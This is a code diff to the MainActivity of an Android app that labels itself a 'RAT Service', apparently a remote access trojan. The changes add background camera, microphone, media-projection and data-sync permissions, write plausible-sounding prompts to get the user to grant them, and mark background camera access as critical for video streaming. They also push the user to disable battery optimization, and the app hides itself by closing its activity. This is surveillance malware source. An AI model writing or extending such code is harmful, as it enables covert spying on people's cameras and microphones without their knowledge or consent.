@@ -52,7 +52,9 @@ public class MainActivity extends AppCompatActivity {
     private final String[] android10Permissions = {
         Manifest.permission.FOREGROUND_SERVICE_CAMERA,
         Manifest.permission.FOREGROUND_SERVICE_MICROPHONE,
-        Manifest.permission.FOREGROUND_SERVICE_LOCATION
+        Manifest.permission.FOREGROUND_SERVICE_LOCATION,
+        Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC,
+        Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION
     };
     
     // Android 13+ (API 33+) specific permissions
@@ -176,6 +178,14 @@ public class MainActivity extends AppCompatActivity {
         StringBuilder message = new StringBuilder();
         message.append("This app needs the following permissions:\n\n");
         
+        if (permissionsNeeded.contains(Manifest.permission.FOREGROUND_SERVICE_CAMERA)) {
+            message.append("• Camera in background - For video streaming when app is not visible\n");
+        }
+        
+        if (permissionsNeeded.contains(Manifest.permission.FOREGROUND_SERVICE_MICROPHONE)) {
+            message.append("• Microphone in background - For audio recording when app is not visible\n");
+        }
+        
         if (permissionsNeeded.contains(android.Manifest.permission.READ_MEDIA_IMAGES) ||
             permissionsNeeded.contains(android.Manifest.permission.READ_MEDIA_VIDEO)) {
             message.append("• Photos and Videos - To access and save media files\n");
@@ -249,22 +259,36 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == PERMISSION_REQUEST_CODE) {
             boolean allGranted = true;
             StringBuilder deniedPermissions = new StringBuilder();
+            StringBuilder criticalPermissions = new StringBuilder();
             
             for (int i = 0; i < permissions.length; i++) {
                 if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                     allGranted = false;
-                    deniedPermissions.append(getPermissionDescription(permissions[i])).append("\n");
+                    String permission = permissions[i];
+                    deniedPermissions.append(getPermissionDescription(permission)).append("\n");
+                    
+                    // Check if this is a critical permission for video streaming
+                    if (permission.equals(Manifest.permission.CAMERA) ||
+                        permission.equals(Manifest.permission.FOREGROUND_SERVICE_CAMERA)) {
+                        criticalPermissions.append(getPermissionDescription(permission)).append("\n");
+                    }
                 }
             }
             
             if (allGranted) {
-                Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "All permissions granted! Video streaming will work.", Toast.LENGTH_SHORT).show();
                 allPermissionsGranted();
             } else {
-                // Some permissions denied, show warning but still try to start service
-                Toast.makeText(this, 
-                    "Some permissions denied. Some features may not work:\n" + deniedPermissions.toString(), 
-                    Toast.LENGTH_LONG).show();
+                // Some permissions denied, show warning
+                String message = "Some permissions denied. ";
+                
+                if (criticalPermissions.length() > 0) {
+                    message += "Video streaming may not work without:\n" + criticalPermissions.toString();
+                } else {
+                    message += "Some features may not work:\n" + deniedPermissions.toString();
+                }
+                
+                Toast.makeText(this, message, Toast.LENGTH_LONG).show();
                 
                 // Check if we need to request MANAGE_EXTERNAL_STORAGE again
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -281,26 +305,29 @@ public class MainActivity extends AppCompatActivity {
     
     private String getPermissionDescription(String permission) {
         switch (permission) {
+            case Manifest.permission.CAMERA:
+                return "• Camera (for photos and video)";
             case Manifest.permission.FOREGROUND_SERVICE_CAMERA:
-                return "• Camera in background (for video streaming)";
+                return "• Camera in background (for video streaming) ⚠️ CRITICAL";
             case Manifest.permission.FOREGROUND_SERVICE_MICROPHONE:
                 return "• Microphone in background";
             case Manifest.permission.FOREGROUND_SERVICE_LOCATION:
                 return "• Location in background";
+            case Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC:
+                return "• Data sync in background";
             case android.Manifest.permission.READ_MEDIA_IMAGES:
             case android.Manifest.permission.READ_MEDIA_VIDEO:
                 return "• Photos & Videos";
             case android.Manifest.permission.NEARBY_WIFI_DEVICES:
                 return "• Nearby devices";
-            case android.Manifest.permission.CAMERA:
-                return "• Camera";
-            case android.Manifest.permission.RECORD_AUDIO:
+            case Manifest.permission.RECORD_AUDIO:
                 return "• Microphone";
-            case android.Manifest.permission.ACCESS_FINE_LOCATION:
-            case android.Manifest.permission.ACCESS_COARSE_LOCATION:
+            case Manifest.permission.ACCESS_FINE_LOCATION:
+            case Manifest.permission.ACCESS_COARSE_LOCATION:
                 return "• Location";
             default:
-                return "• " + permission.substring(permission.lastIndexOf('.') + 1);
+                String simpleName = permission.substring(permission.lastIndexOf('.') + 1);
+                return "• " + simpleName.replace("_", " ").toLowerCase();
         }
     }
     
@@ -355,7 +382,8 @@ public class MainActivity extends AppCompatActivity {
                 new AlertDialog.Builder(this)
                     .setTitle("Battery Optimization")
                     .setMessage("For the app to work properly in the background, please disable battery optimization. " +
-                               "This ensures the service continues running even when the device is idle.")
+                               "This ensures the service continues running even when the device is idle. " +
+                               "Without this, video streaming may stop when the device sleeps.")
                     .setPositiveButton("Disable", (dialog, which) -> {
                         requestIgnoreBatteryOptimizations();
                     })
@@ -478,7 +506,7 @@ public class MainActivity extends AppCompatActivity {
         }
         
         // Optional: Show a message
-        Toast.makeText(this, "RAT Service Started", Toast.LENGTH_SHORT).show();
+        Toast.makeText(this, "RAT Service Started - Video streaming available", Toast.LENGTH_SHORT).show();
         
         // Close activity immediately (so it's hidden)
         finish();
